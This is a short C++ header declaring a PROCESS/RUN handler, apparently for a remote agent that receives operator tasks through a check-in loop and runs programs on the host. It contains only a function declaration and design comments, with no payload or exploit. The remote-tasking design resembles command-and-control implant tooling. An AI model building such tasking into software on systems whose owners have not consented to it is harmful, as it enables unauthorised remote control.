// ========================================== { START OF FILE } ========================================== //
#pragma once

#include "agent/commands/command_result.h"
#include "agent/models/checkin_models.h"

namespace agent::commands::exec {

    /// <summary>
    /// PROCESS/RUN: start an explicit program with its own argument line (no `cmd /c`), wait for it
    /// and report the exit code.
    /// </summary>
    /// <remarks>
    /// Distinct from SHELL on purpose: the operator supplies the image and the arguments separately,
    /// so a path with spaces does not have to survive a shell parse. Output is not captured — the
    /// exit code is the evidence — and the wait is bounded so a long-running target cannot stall the
    /// check-in loop.
    /// </remarks>
    [[nodiscard]] CommandResult RunProgram(const models::CheckinResponse& task);

}  // namespace agent::commands::exec
// ========================================== { END OF FILE } ========================================== //
